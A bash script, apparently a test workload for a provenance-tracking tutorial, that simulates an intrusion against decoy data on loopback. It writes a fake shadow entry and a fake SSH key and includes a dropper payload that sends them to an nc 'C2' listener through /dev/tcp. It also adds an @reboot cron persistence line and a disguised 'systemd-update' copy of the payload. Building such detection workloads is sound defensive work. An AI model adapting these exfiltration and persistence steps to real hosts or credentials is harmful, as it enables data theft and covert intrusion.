#!/bin/bash
# A staged kill chain for the streaming tutorial (docs/docs/features/streaming_tutorial.md),
# built entirely from ordinary binaries and decoy data: discovery, payload drop, execution,
# credential access (a FAKE shadow/key file), exfiltration to a LOOPBACK listener, and a
# persistence file. Nothing malicious runs and nothing leaves the machine; the point is to
# produce a recognisable provenance pattern in an otherwise benign capture.
#   usage: bash scripts/workload/incident.sh [work_dir]
set -u
WORK="${1:-/tmp/spade_work}"
HIDDEN="$WORK/.cache/.hidden"
mkdir -p "$HIDDEN"
printf 'admin:$6$fake$notarealhash:19000:0:99999:7:::\n' > "$WORK/fake_shadow"
printf -- '-----BEGIN OPENSSH PRIVATE KEY-----\nZmFrZSBrZXkgZm9yIHRlc3Rpbmcgb25seQo=\n-----END OPENSSH PRIVATE KEY-----\n' > "$WORK/fake_id_rsa"

(timeout 40 nc -l 127.0.0.1 14444 > "$WORK/c2_session.txt" 2>/dev/null) &
LISTENER=$!
sleep 1

# stage 1 - discovery, as an intruder would orient themselves
{ id; uname -a; ps -u "$(id -un)" -o pid,comm --no-headers | head -20; ls -la "$HOME" 2>/dev/null | head -10; } > "$HIDDEN/recon.txt" 2>/dev/null

# stage 2 - a dropper writes the payload
cat > "$HIDDEN/updater" << 'PAYLOAD'
#!/bin/bash
WORK="$1"
for secret in fake_shadow fake_id_rsa; do
    cat "$WORK/$secret" > /dev/tcp/127.0.0.1/14444
    sleep 0.3
done
cat "$WORK/.cache/.hidden/recon.txt" > /dev/tcp/127.0.0.1/14444
PAYLOAD
chmod 755 "$HIDDEN/updater"

# stage 3 - execution and exfiltration
"$HIDDEN/updater" "$WORK" 2>/dev/null

# stage 4 - persistence
printf '@reboot %s/updater %s\n' "$HIDDEN" "$WORK" > "$HIDDEN/.persist.cron"
cp "$HIDDEN/updater" "$WORK/.cache/systemd-update" 2>/dev/null

wait $LISTENER 2>/dev/null
echo "kill chain done, C2 received $(wc -c < "$WORK/c2_session.txt" 2>/dev/null) bytes"
